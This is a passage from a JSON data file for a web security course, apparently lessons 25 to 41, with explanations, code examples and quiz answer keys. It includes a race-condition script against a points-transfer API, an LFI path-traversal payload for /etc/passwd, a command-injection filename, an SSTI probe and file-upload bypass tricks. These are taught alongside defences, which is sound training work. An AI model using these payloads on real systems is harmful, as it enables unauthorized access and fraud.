                    "Manipulate application workflows to achieve unintended outcomes"
                ],
                "content": {
                    "overview": "Business logic vulnerabilities are a class of flaws that exist because an application's workflow can be abused in a way that the developers did not anticipate. They are not typically technical flaws in a single line of code, but rather flaws in the concept of the process itself. This lesson covers how to find and exploit these subtle but often critical vulnerabilities.",
                    "sections": [
                        {
                            "title": "Testing for Business Logic Flaws",
                            "content": "<p>This type of testing requires you to think like a creative attacker. You need to deeply understand how the application is *supposed* to work, and then try to find ways to subvert that workflow.</p><h3>Common Flaws to Test For:</h3><ul><li><strong>Parameter Tampering:</strong> Can you manipulate prices in an e-commerce checkout workflow by modifying the value in a hidden form field?</li><li><strong>Workflow Bypass:</strong> Can you skip a step in a multi-step process? For example, can you browse directly to step 3 of a registration workflow without completing step 2?</li><li><strong>Race Conditions:</strong> Can you perform an action (like redeeming a coupon or voting) multiple times simultaneously by sending multiple requests in parallel before the system has time to update its state?</li></ul>",
                            "image": "https://images.unsplash.com/photo-1499750310107-5fef28a66643?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Exploiting a Race Condition with Python's `threading`",
                        "language": "python",
                        "code": "import requests\nimport threading\n\n# Scenario: A feature allows you to transfer loyalty points to another user.\n# It checks your balance, then makes the transfer, but there's no lock.\n# An attacker can send multiple transfer requests at the same time to transfer more points than they have.\n\nURL = 'https://example.com/api/points/transfer'\nHEADERS = {'Cookie': 'sessionID=attacker_session_token'}\nDATA = {'to_user': 'bob', 'amount': 100}\n\ndef transfer_points():\n    requests.post(URL, headers=HEADERS, json=DATA)\n\nthreads = []\nfor i in range(10): # Send 10 requests nearly simultaneously\n    t = threading.Thread(target=transfer_points)\n    threads.append(t)\n    t.start()\n\nfor t in threads:\n    t.join()"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A vulnerability where an attacker can modify the price of an item in their shopping cart by changing the value in a hidden HTML form field is a:", "options": ["Cross-Site Scripting flaw", "SQL Injection flaw", "Business Logic flaw", "Server misconfiguration"], "correct": 2, "explanation": "This is a classic business logic flaw. The server is incorrectly trusting a piece of data from the client (the price) that should have been securely validated and retrieved from the backend." }
                    ]
                }
            },
            {
                "id": "lesson-26-session-management-security",
                "title": "Lesson 26: Session Management Security",
                "duration": "120 min",
                "objectives": [
                    "Perform deep analysis of session token generation for predictability",
                    "Understand and exploit session fixation vulnerabilities",
                    "Test for insecure handling of concurrent sessions",
                    "Implement secure session timeout and invalidation controls"
                ],
                "content": {
                    "overview": "The user's session is the key to their authenticated state. Hijacking a session is often as good as stealing a password. This advanced lesson focuses on the vulnerabilities that arise from insecurely managed sessions, moving beyond the basics to cover subtle but critical flaws like session fixation.",
                    "sections": [
                        {
                            "title": "Session Token Analysis",
                            "content": "<p>A session token must be long, random, and unpredictable. As a tester, you should collect hundreds of session tokens and analyze them for patterns.</p><h3>What to Look For:</h3><ul><li><strong>Entropy:</strong> Use a tool's 'sequencer' or entropy checker to analyze the randomness of the tokens. Low entropy means the tokens are predictable.</li><li><strong>Meaningful Information:</strong> A common bad practice is to encode user information (like a username or user ID) directly in the session token. An attacker who can decode this might be able to craft tokens for other users.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit-crop"
                        },
                        {
                            "title": "Session Fixation",
                            "content": "<p>Session fixation is a subtle attack that allows an adversary to force a user's browser to use a session token that the adversary already knows.</p><h3>The Attack Flow:</h3><ol><li>An attacker visits the application's login page. The server issues a new, unauthenticated session token. The attacker takes note of this token.</li><li>The attacker tricks the victim into clicking a link to the application that includes this specific session token (e.g., `https://example.com/login?sessionid=ATTACKERS_KNOWN_TOKEN`).</li><li>The victim's browser now has the attacker's token.</li><li>The victim logs in with their own username and password.</li><li>**The vulnerability:** The application fails to generate a *new* session token for the user upon successful login. Instead, it simply associates the attacker's known token with the victim's now-authenticated session.</li><li>The attacker can now use that token to access the victim's session.</li></ol><p>The defense is to **always** generate a new session token upon any change in privilege level, especially after a user successfully logs in.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-6a7e3206a5a2?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the critical defense against session fixation attacks?", "options": ["Using longer session tokens", "Logging all session creation events", "Always generating a new session token upon successful authentication", "Forcing users to change their password"], "correct": 2, "explanation": "Regenerating the session ID upon login is the primary mitigation. This ensures that even if an attacker knew the pre-authentication session token, it becomes invalid the moment the victim's credentials are validated." }
                    ]
                }
            },
            {
                "id": "lesson-27-javascript-frameworks",
                "title": "Lesson 27: JavaScript Framework Security",
                "duration": "120 min",
                "objectives": [
                    "Identify security best practices and common pitfalls in React",
                    "Understand Angular's built-in security features and limitations",
                    "Assess the security posture of Node.js applications and their dependencies"
                ],
                "content": {
                    "overview": "Modern web development is dominated by JavaScript frameworks. While these frameworks often provide built-in security features, they can also introduce new risks if not used correctly. This lesson covers the security considerations for the most popular JavaScript frameworks.",
                    "sections": [
                        {
                            "title": "React Security",
                            "content": "<p>React is known for providing strong, default protection against traditional XSS. By default, it automatically encodes data before rendering it in the DOM. However, developers can override this.</p><ul><li><strong>`dangerouslySetInnerHTML`:</strong> React provides this property as a way to render raw HTML. Any time you see this in code, it should be a major red flag that requires a very close security review to ensure the HTML being set is properly sanitized.</li><li><strong>Component Hijacking:</strong> Attackers might find ways to control which component gets rendered, potentially leading to unintended behavior.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1633356122102-3fe601e05bd2?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Angular Security",
                            "content": "<p>Angular also provides strong, context-aware encoding by default to prevent XSS. It also has a built-in defense against Cross-Site Request Forgery (CSRF). However, like React, these features can be bypassed.</p><ul><li><strong>Bypassing Sanitization:</strong> Developers can use methods like `bypassSecurityTrustHtml` to tell Angular to trust a given string of HTML and render it without encoding. This is highly dangerous if the HTML is user-controlled.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1565516322303-3c1a2f45c8f2?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Seeing `dangerouslySetInnerHTML` in a React application's source code should be treated as:", "options": ["A standard and safe function to use everywhere", "A high-risk area that requires a careful security review to check for potential XSS vulnerabilities", "An indicator that the application is very fast", "A feature that automatically fixes all security bugs"], "correct": 1, "explanation": "The name is a deliberate warning from the React team. It indicates that the developer is intentionally bypassing React's built-in XSS protections, which requires careful validation to ensure it is done safely." }
                    ]
                }
            },
            {
                "id": "lesson-28-php-security",
                "title": "Lesson 28: PHP Security Assessment",
                "duration": "120 min",
                "objectives": [
                    "Identify classic PHP vulnerabilities like Remote and Local File Inclusion (RFI/LFI)",
                    "Review framework security for common PHP frameworks like Laravel and Symfony",
                    "Securely configure PHP to mitigate common risks",
                    "Audit file upload functionality for security flaws"
                ],
                "content": {
                    "overview": "PHP remains one of the most widely used server-side languages on the web. This lesson covers vulnerabilities that are particularly common in older or poorly-written PHP code, with a focus on Remote and Local File Inclusion (RFI/LFI).",
                    "sections": [
                        {
                            "title": "File Inclusion Vulnerabilities (RFI/LFI)",
                            "content": "<p>This class of vulnerability was very common in older PHP applications. It occurs when a developer uses a user-supplied parameter in a function like `include` or `require`.</p><ul><li><strong>Local File Inclusion (LFI):</strong> Allows an attacker to include and execute a local file from the server. By using path traversal (`../`), an attacker can read sensitive files from anywhere on the server. For example: `/app.php?page=../../../../etc/passwd`.</li><li><strong>Remote File Inclusion (RFI):</strong> A more dangerous variant. If the server is configured for it, an attacker can provide a URL to a remote server. The vulnerable PHP application will then download and execute the attacker's script from that remote server, leading to an immediate and full compromise.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Vulnerable LFI/RFI Code (PHP)",
                        "language": "php",
                        "code": "<?php\n// DANGER: The 'page' parameter from the URL is passed directly into an `include` statement.\n$page = $_GET['page'];\ninclude($page . \".php\");\n?>"
                    },
                    {
                        "title": "Exploiting LFI for Path Traversal",
                        "language": "http",
                        "code": "# Attacker wants to read the /etc/passwd file.\n# The '.php' is appended by the code, but the %00 (null byte) trick can sometimes terminate the string early.\nhttps://vulnerable.com/index.php?page=../../../../etc/passwd%00"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A vulnerability that allows an attacker to force an application to include and execute a file from a remote, attacker-controlled server is known as:", "options": ["SQL Injection", "Remote File Inclusion (RFI)", "Local File Inclusion (LFI)", "Cross-Site Scripting (XSS)"], "correct": 1, "explanation": "RFI is a particularly devastating vulnerability as it gives the attacker a direct way to achieve Remote Code Execution." }
                    ]
                }
            },
            {
                "id": "lesson-29-java-web-security",
                "title": "Lesson 29: Java Web Security",
                "duration": "120 min",
                "objectives": [
                    "Recognize Java-specific vulnerabilities, particularly in older J2EE applications",
                    "Understand the security architecture of the Spring framework",
                    "Exploit insecure deserialization vulnerabilities in Java libraries"
                ],
                "content": {
                    "overview": "Java is the backbone of countless enterprise web applications. This lesson explores the security landscape of Java web development, with a focus on the security of the ubiquitous Spring Framework and the high-impact risk of insecure deserialization.",
                    "sections": [
                        {
                            "title": "Insecure Deserialization in Java",
                            "content": "<p>Java's native serialization format is a common vector for insecure deserialization attacks. Many older applications read Java objects directly from untrusted network streams. Attackers can use tools like `ysoserial` to craft a malicious serialized object that, when deserialized by the application, will execute a chain of commands (a 'gadget chain') from available libraries on the application's classpath to achieve Remote Code Execution.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Spring Security",
                            "content": "<p>The Spring Security framework is the de facto standard for securing modern Java web applications. It provides a robust, pluggable architecture for handling authentication, authorization, and CSRF protection. A key aspect of a Java security review is to ensure that Spring Security is correctly configured and that all necessary endpoints are protected.</p>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary risk associated with deserializing untrusted Java objects?", "options": ["Slow performance", "High memory usage", "Remote Code Execution (RCE)", "The file format is too large"], "correct": 2, "explanation": "Insecure deserialization in Java is one of the most critical web vulnerabilities, often leading directly to a full server compromise." }
                    ]
                }
            },
            {
                "id": "lesson-30-dotnet-app-security",
                "title": "Lesson 30: .NET Application Security",
                "duration": "120 min",
                "objectives": [
                    "Assess the security of ASP.NET and modern .NET Core applications",
                    "Analyze the security of ViewState in legacy ASP.NET Web Forms",
                    "Test authentication provider and identity framework configurations"
                ],
                "content": {
                    "overview": ".NET is the primary framework for web development in the Microsoft ecosystem. This lesson covers the security considerations for both legacy ASP.NET applications and modern applications built on .NET Core and .NET 5/6+.",
                    "sections": [
                        {
                            "title": "ViewState Security",
                            "content": "<p>In older ASP.NET Web Forms applications, a large, Base64-encoded hidden form field called `__VIEWSTATE` was used to maintain the state of controls on a page. By default, this data was not encrypted, only encoded. An attacker could decode it, modify values, and potentially bypass client-side controls. Worse, if ViewState MAC (Message Authentication Code) was disabled, they could even potentially achieve remote code execution through deserialization attacks on the ViewState object.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        },
                        {
                            "title": ".NET Identity and Core",
                            "content": "<p>Modern ASP.NET Core applications have a much stronger security model by default. The ASP.NET Core Identity framework provides a complete solution for authentication and user management, with built-in protections against CSRF and other common attacks. Security reviews of modern .NET apps focus on ensuring these built-in protections are correctly configured and have not been accidentally disabled.</p>",
                            "image": "https://images.unsplash.com/photo-1638218151909-86641b4e4776?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "The large, Base64-encoded `__VIEWSTATE` hidden field is a key component of which legacy technology?", "options": ["Modern ASP.NET Core", "PHP", "ASP.NET Web Forms", "React"], "correct": 2, "explanation": "ViewState was a core part of the state management in the older Web Forms model and a common source of security vulnerabilities if not configured correctly." }
                    ]
                }
            },
            {
                "id": "lesson-31-serverless-security",
                "title": "Lesson 31: Serverless Security Testing",
                "duration": "120 min",
                "objectives": [
                    "Assess the security of serverless functions (e.g., AWS Lambda, Azure Functions)",
                    "Identify 'event injection' vulnerabilities in event-driven architectures",
                    "Test API Gateway configurations for security flaws"
                ],
                "content": {
                    "overview": "Serverless architectures, built on services like AWS Lambda and Azure Functions, change the attack surface. This lesson covers how to test these modern, event-driven applications, with a focus on IAM permissions and a new class of vulnerability: event injection.",
                    "sections": [
                        {
                            "title": "The Serverless Attack Surface",
                            "content": "<p>In a serverless model, you no longer manage the underlying OS, so you don't worry about patching. Instead, the attack surface shifts to:</p><ul><li><strong>IAM Permissions:</strong> The single most important control. Each function should have its own execution role with the absolute minimum set of permissions it needs.</li><li><strong>Function Code:</strong> Your own code is still a source of vulnerabilities.</li><li><strong>Triggers:</strong> The events that trigger your function.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit-crop"
                        },
                        {
                            "title": "Event Injection",
                            "content": "<p>Event injection is the serverless equivalent of command injection. Many functions are triggered by an event, such as a file being uploaded to an S3 bucket. The event itself contains data (like the object's key/filename). If the function code then blindly trusts the data from this event (e.g., using the filename in a shell command), an attacker could trigger the function by uploading a specially crafted filename (e.g., `myfile.txt; ls -la`) to trigger a command injection attack. All input, even from seemingly trusted event sources, must be validated.</p>",
                            "image": "https://images.unsplash.com/photo-1461749280684-dccba630e2f6?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is considered the most critical security control for a serverless function?", "options": ["The runtime it uses", "Its execution role and the associated IAM permissions", "Its name", "The amount of memory it is configured with"], "correct": 1, "explanation": "The execution role defines the 'blast radius' of a compromised function. Enforcing least privilege here is the most important security boundary." }
                    ]
                }
            },
            {
                "id": "lesson-32-container-security",
                "title": "Lesson 32: Container Security Assessment",
                "duration": "120 min",
                "objectives": [
                    "Identify insecure Docker container configurations",
                    "Assess the security of a Kubernetes cluster for common misconfigurations",
                    "Understand container runtime security and how to detect a container breakout"
                ],
                "content": {
                    "overview": "Containers have revolutionized deployment, but they introduce new layers and new security risks. This lesson covers the key areas to assess when performing a security test of a containerized environment, from the host and daemon to the image and the running container.",
                    "sections": [
                        {
                            "title": "Common Misconfigurations",
                            "content": "<ul><li><strong>Running containers as root:</strong> By default, containers run as the root user. This is a bad practice. If an attacker escapes the container, they will be root on the host. Containers should be run as a non-root user.</li><li><strong>Exposing the Docker Socket:</strong> Mounting the Docker daemon socket (`/var/run/docker.sock`) inside a container is extremely dangerous. It effectively gives that container full root control over the host machine.</li><li><strong>Insecure Kubernetes Configurations:</strong> Allowing anonymous access to the Kubernetes API server, or granting overly permissive RBAC roles (like `cluster-admin`) to service accounts used by pods.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1579543183319-a16eee1b1fd3?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why is mounting the Docker socket (`docker.sock`) into a container a significant security risk?", "options": ["It makes the container run slower", "It gives the process inside the container full, root-level control over the host's Docker daemon, allowing for container breakouts", "It is required for all containers to run", "It uses too much disk space"], "correct": 1, "explanation": "This is a classic 'privilege escalation' misconfiguration. A container that controls the host's Docker daemon can start any other container with any permissions it wants, including one that mounts the host's root file system." }
                    ]
                }
            },
            {
                "id": "lesson-33-microservices-security",
                "title": "Lesson 33: Microservices Security",
                "duration": "120 min",
                "objectives": [
                    "Assess the security of service-to-service communication",
                    "Test for vulnerabilities in API Gateways that act as the entry point",
                    "Understand how a service mesh like Istio can be used to implement a Zero Trust network",
                    "Test for distributed authentication and authorization flaws"
                ],
                "content": {
                    "overview": "A microservices architecture breaks down a large application into dozens or hundreds of small, independent services. This lesson covers the security challenges of this distributed model, focusing on the new perimeter: the service-to-service API call.",
                    "sections": [
                        {
                            "title": "The New Perimeter",
                            "content": "<p>In a monolithic application, most 'calls' are just function calls within a single process. In a microservices architecture, they are network calls between different services. This dramatically increases the attack surface.</p><h3>Key Challenges:</h3><ul><li><strong>Service-to-Service Authentication:</strong> How does `Service A` know that the service calling it is actually `Service B` and not an attacker? Every single service must authenticate its callers. This is often done using OAuth 2.0 and JWTs.</li><li><strong>Defense in Depth:</strong> You can no longer assume that a request coming from inside the network is trusted. Every microservice must validate the user's permissions itself and should not blindly trust its callers. This is a core Zero Trust principle.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1599691888286-93e433f064b8?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "In a microservices architecture, why is service-to-service authentication so critical?", "options": ["It isn't, services can trust each other", "Because most communication is now happening over the network, and each service needs to verify the identity of its callers to prevent spoofing and unauthorized access", "It makes the services run faster", "It reduces the number of services needed"], "correct": 1, "explanation": "In a Zero Trust microservices environment, every single API call, even between internal services, must be authenticated and authorized." }
                    ]
                }
            },
            {
                "id": "lesson-34-graphql-security",
                "title": "Lesson 34: GraphQL Security Testing",
                "duration": "120 min",
                "objectives": [
                    "Understand how GraphQL differs from REST and the security implications",
                    "Test for authorization bypass by analyzing the GraphQL schema",
                    "Identify and exploit query complexity attacks leading to denial of service",
                    "Protect against abuse of the introspection query"
                ],
                "content": {
                    "overview": "GraphQL is a powerful query language for APIs that gives clients the power to ask for exactly the data they need. This flexibility also introduces new and unique security vulnerabilities. This lesson covers the security assessment of GraphQL APIs.",
                    "sections": [
                        {
                            "title": "Query Complexity and Introspection",
                            "content": "<ul><li><strong>Introspection Abuse:</strong> GraphQL has a built-in 'introspection' system that allows a client to query the API for its entire schemaall the available types, fields, queries, and mutations. If left enabled in production, this gives an attacker a complete roadmap of your entire API and data model.</li><li><strong>Query Complexity Attacks:</strong> An attacker can craft a deeply nested, circular query that is very expensive for the server to resolve. For example, 'Get me the user, and for that user get all their friends, and for each friend get all of *their* friends...', and so on. Without proper depth limiting and complexity analysis, these queries can easily exhaust server resources and cause a denial of service.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary risk of leaving the GraphQL introspection query enabled in a production environment?", "options": ["It makes the API slow", "It provides a detailed roadmap of the entire API and data schema to an attacker", "It costs more money", "It encrypts the data"], "correct": 1, "explanation": "Introspection is a powerful development tool, but in production, it is a massive information disclosure vulnerability." },
                        { "id": 2, "question": "Crafting a deeply nested query to exhaust server resources is known as what kind of attack?", "options": ["An injection attack", "An authentication bypass", "A query complexity attack", "A cross-site scripting attack"], "correct": 2, "explanation": "This is a GraphQL-specific denial-of-service attack vector that must be mitigated by implementing controls like query depth limiting, cost analysis, or query timeouts." }
                    ]
                }
            },
            {
                "id": "lesson-35-advanced-injection",
                "title": "Lesson 35: Advanced Injection Techniques",
                "duration": "120 min",
                "objectives": [
                    "Identify and exploit Server-Side Template Injection (SSTI) vulnerabilities",
                    "Understand and test for Server-Side Includes (SSI) injection",
                    "Recognize Expression Language (EL) injection flaws"
                ],
                "content": {
                    "overview": "This lesson moves beyond standard SQL and OS command injection to cover a range of advanced and often highly critical injection vulnerabilities that can occur in modern web frameworks and templating engines.",
                    "sections": [
                        {
                            "title": "Server-Side Template Injection (SSTI)",
                            "content": "<p>SSTI occurs when user input is insecurely embedded into a template on the server. Many web frameworks use templating engines (like Jinja2 in Python or Freemarker in Java) to render HTML. These engines often have powerful features, including the ability to execute code.</p><p>An attacker can test for this by submitting a simple mathematical operation as a payload, like `{{7*7}}`. If the server's response contains `49`, it confirms that a templating engine is evaluating the user's input. A skilled attacker can then often craft a payload that breaks out of the sandbox and executes arbitrary operating system commands, leading to full Remote Code Execution (RCE).</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "An attacker submits `{{7*7}}` as their username and the resulting webpage displays `49`. This is a strong indicator of which vulnerability?", "options": ["SQL Injection", "Cross-Site Scripting", "Server-Side Template Injection (SSTI)", "Cross-Site Request Forgery"], "correct": 2, "explanation": "This response indicates that a server-side templating engine is improperly evaluating the user-supplied input as a template expression, which is the root cause of SSTI." }
                    ]
                }
            },
            {
                "id": "lesson-36-client-side-attacks",
                "title": "Lesson 36: Client-Side Attack Vectors",
                "duration": "120 min",
                "objectives": [
                    "Understand and exploit clickjacking attacks",
                    "Assess the security of HTML5 features like WebSockets and PostMessage",
                    "Identify and test for DOM Clobbering vulnerabilities"
                ],
                "content": {
                    "overview": "This lesson provides a deep dive into advanced client-side attacks that go beyond traditional XSS. We will explore how attackers can abuse browser features to trick users and manipulate client-side logic.",
                    "sections": [
                        {
                            "title": "Clickjacking",
                            "content": "<p>Clickjacking is an attack where an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the top-level page. The attacker loads the target site in a transparent `<iframe>` and lays it over a decoy page. The user thinks they are clicking 'Play Video' on the decoy, but they are actually invisibly clicking the 'Delete My Account' button on the underlying target site.</p><h3>The Defense:</h3><p>The primary defense is the `X-Frame-Options` HTTP header or the `frame-ancestors` directive in a Content Security Policy. By sending the header `X-Frame-Options: DENY`, a server instructs the browser to never allow its pages to be rendered inside an iframe, which completely mitigates clickjacking.</p>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary defense against clickjacking attacks?", "options": ["A strong password policy", "Using the `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` HTTP headers", "Encrypting the website's data", "Input validation"], "correct": 1, "explanation": "These headers are a direct instruction to the browser, telling it whether the page is allowed to be framed, which is the root mechanism of a clickjacking attack." }
                    ]
                }
            },
            {
                "id": "lesson-37-file-upload-security",
                "title": "Lesson 37: File Upload Security",
                "duration": "120 min",
                "objectives": [
                    "Bypass weak file upload validation checks",
                    "Exploit path traversal to place malicious files in unintended locations",
                    "Understand the risk of attacks like image-based malware (`polyglots`)"
                ],
                "content": {
                    "overview": "Functionality that allows users to upload files is a high-risk area. If not properly secured, an attacker can upload a web shell, giving them full control of the server, or can upload malicious files to attack other users. This lesson covers how to test and secure file upload features.",
                    "sections": [
                        {
                            "title": "File Upload Bypass Techniques",
                            "content": "<p>Developers often try to implement their own validation, which is often flawed.</p><h3>Common Bypasses:</h3><ul><li><strong>Weak File Extension Check:</strong> A developer might have a deny-list that blocks `.php`. An attacker might try extensions like `.php5`, `.phtml`, or use case variations like `.PhP`.</li><li><strong>Content-Type Validation Bypass:</strong> The application might check the `Content-Type` header sent by the browser. This is completely user-controlled. An attacker can upload a web shell but set the `Content-Type` to `image/jpeg`.</li><li><strong>Path Traversal:</strong> An attacker might provide a filename like `../../malicious.php`. If the server doesn't properly sanitize the filename, it might save the file outside of the intended uploads directory, placing it in a web-accessible directory where it can be executed.</li></ul><p>The correct defense is a multi-layered approach: check for a valid file extension from an allow-list, verify the file's magic number to ensure its type, and save the file with a randomly generated filename to a directory that is outside of the web root.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why is checking only the `Content-Type` header to validate an uploaded file's type insecure?", "options": ["The header is always accurate", "The header can be easily manipulated by an attacker to any value they want", "It is an encrypted header", "The header is too long"], "correct": 1, "explanation": "The Content-Type header is part of the client-controlled HTTP request and cannot be trusted for security validation. The server must validate the file's actual content, for example, by checking its magic number (file signature)." }
                    ]
                }
            },
            {
                "id": "lesson-38-race-conditions",
                "title": "Lesson 38: Race Condition and Timing Attacks",
                "duration": "120 min",
                "objectives": [
                    "Understand how race condition vulnerabilities occur in web applications",
                    "Use tools to send multiple requests in parallel to exploit a race condition",
                    "Test for Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities"
                ],
                "content": {
                    "overview": "A race condition is a vulnerability that occurs when a system that is designed to handle requests sequentially is forced to handle multiple requests in parallel, leading to unintended behavior. This lesson covers how to identify and exploit these often hard-to-find timing vulnerabilities.",
                    "sections": [
                        {
                            "title": "TOCTOU Flaws",
                            "content": "<p>Time-of-Check to Time-of-Use (TOCTOU) is the classic race condition pattern. The application performs a check, and then, based on that check, it performs an action. An attacker tries to change the state *between* the check and the use.</p><h3>Example: Online Vouchers</h3><ol><li>A user wants to redeem a single-use voucher. They send a request.</li><li>**The Check:** The server checks the database: 'Has this voucher been used yet?' The answer is no.</li><li>An attacker, using an automated tool, sends 100 identical requests at the same instant.</li><li>All 100 requests arrive at the server. For all of them, the initial check passes, because the 'used' flag in the database hasn't been set yet.</li><li>**The Use:** The server now proceeds to process all 100 requests, granting the user the voucher's value 100 times, even though they only had one valid voucher.</li></ol><p>The defense is to use database-level locking (transactions) to ensure that the check and the use are an 'atomic' operation that cannot be interrupted.</p>",
                            "image": "https://images.unsplash.com/photo-1499750310107-5fef28a66643?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A TOCTOU vulnerability is a type of what?", "options": ["SQL Injection", "Race Condition", "Cross-Site Scripting", "File Upload flaw"], "correct": 1, "explanation": "TOCTOU is the canonical example of a race condition, where an attacker influences a resource after it has been checked for validity but before it has been used." }
                    ]
                }
            },
            {
                "id": "lesson-39-security-control-implementation",
                "title": "Lesson 39: Security Control Implementation",
                "duration": "120 min",
                "objectives": [
                    "Implement robust input validation using allow-lists",
                    "Apply context-aware output encoding to prevent XSS",
                    "Deploy and configure key security headers, including a strong Content Security Policy (CSP)"
                ],
                "content": {
                    "overview": "This lesson transitions from finding vulnerabilities to fixing them. We will cover the core 'proactive controls' that developers can implement to build more secure applications from the ground up, with a focus on input validation, output encoding, and a strong Content Security Policy.",
                    "sections": [
                        {
                            "title": "Input Validation: Allow-lists vs. Deny-lists",
                            "content": "<p>All input from the client must be validated.</p><ul><li><strong>Deny-list (Blacklist):</strong> You try to create a list of all possible 'bad' characters (e.g., `< > ' \" ;`) and block them. This is brittle and often easily bypassed because it's impossible to think of every possible bad input.</li><li><strong>Allow-list (Whitelist):</strong> The recommended approach. You define exactly what a 'good' input is allowed to contain (e.g., a US ZIP code can only contain 5-9 digits and a hyphen). Any input that does not match this strict definition is rejected. This is much more secure because you are defining what is good, rather than guessing at what is bad.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Content Security Policy (CSP)",
                            "content": "<p>CSP is the most powerful defense-in-depth control against XSS. It is an HTTP response header that gives you fine-grained control over what resources a browser is allowed to load for your page. For example, a strict CSP could state that scripts can *only* be loaded from your own domain and from `apis.google.com`. Even if an attacker finds an XSS flaw, their attempt to load a malicious script from `attacker.com` will be blocked by the browser because that domain is not on the allow-list.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "When performing input validation, which approach is more secure?", "options": ["An allow-list (whitelist)", "A deny-list (blacklist)"], "correct": 0, "explanation": "An allow-list is fundamentally more secure because it forces you to define a strict model for what is considered valid data. Anything that doesn't conform to this model is rejected, which is a much safer default than trying to guess every possible permutation of bad input." }
                    ]
                }
            },
            {
                "id": "lesson-40-secure-development-practices",
                "title": "Lesson 40: Secure Development Practices",
                "duration": "120 min",
                "objectives": [
                    "Integrate security into the entire Software Development Lifecycle (SDLC)",
                    "Establish a secure code review process",
                    "Promote a culture of security among developers through training"
                ],
                "content": {
                    "overview": "This lesson looks at the big picture of application security, covering how to embed security practices into every phase of the development lifecycle to create a mature Secure SDLC (S-SDLC).",
                    "sections": [
                        {
                            "title": "The Secure SDLC",
                            "content": "<p>A secure SDLC 'shifts left', moving security from an afterthought at the end of the process to an integrated part of every phase.</p><ul><li><strong>Requirements:</strong> Define security requirements alongside functional requirements.</li><li><strong>Design:</strong> Perform threat modeling to find and fix design flaws.</li><li><strong>Development:</strong> Provide developers with secure coding training and standards.</li><li><strong>Testing:</strong> Integrate automated security testing (SAST, DAST, SCA) into the CI/CD pipeline and perform manual penetration tests.</li><li><strong>Deployment:</strong> Harden the production environment and use IaC.</li><li><strong>Maintenance:</strong> Continuously monitor for new vulnerabilities and have a plan for patching.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary goal of a Secure SDLC?", "options": ["To make development slower", "To integrate security practices into every phase of the development lifecycle, from design to deployment", "To eliminate the need for security testing", "To focus on security only at the end of the process"], "correct": 1, "explanation": "The S-SDLC is a holistic process designed to make security a shared responsibility and a continuous activity, not a final, isolated gate." }
                    ]
                }
            },
            {
                "id": "lesson-41-waf-protection",
                "title": "Lesson 41: WAF and Protection Mechanisms",
                "duration": "120 min",
                "objectives": [
                    "Understand the role of a Web Application Firewall (WAF) as a defense-in-depth control",
                    "Tune WAF rules to reduce false positives",
                    "Implement rate limiting and bot protection strategies at the edge"
                ],
                "content": {
